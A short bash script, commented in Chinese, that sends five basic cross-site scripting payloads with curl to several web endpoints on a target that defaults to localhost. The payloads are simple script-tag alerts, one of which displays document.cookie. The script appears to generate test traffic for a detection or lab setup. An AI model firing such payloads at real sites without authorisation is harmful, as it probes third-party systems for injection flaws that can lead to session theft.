#!/bin/bash
# XSS 跨站脚本攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./xss.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[XSS] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/5] <script>alert(1)</script>"
curl -s "http://$TARGET/comment?text=%3Cscript%3Ealert(1)%3C/script%3E" > /dev/null
sleep 0.3

echo "  [2/5] <script>alert(document.cookie)</script>"
curl -s -X POST "http://$TARGET/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "bio=%3Cscript%3Ealert(document.cookie)%3C/script%3E" > /dev/null
sleep 0.3

echo "  [3/5] <script>alert('xss')</script>"
curl -s "http://$TARGET/search?q=%3Cscript%3Ealert(%27xss%27)%3C/script%3E" > /dev/null
sleep 0.3

echo "  [4/5] <SCRIPT>alert(1)</SCRIPT> (大写)"
curl -s -X POST "http://$TARGET/feedback" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "msg=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E" > /dev/null
sleep 0.3

echo "  [5/5] <script>confirm(1)</script>"
curl -s "http://$TARGET/page?name=%3Cscript%3Econfirm(1)%3C/script%3E" > /dev/null
sleep 0.3

echo "[XSS] 完成 (5 次攻击)"
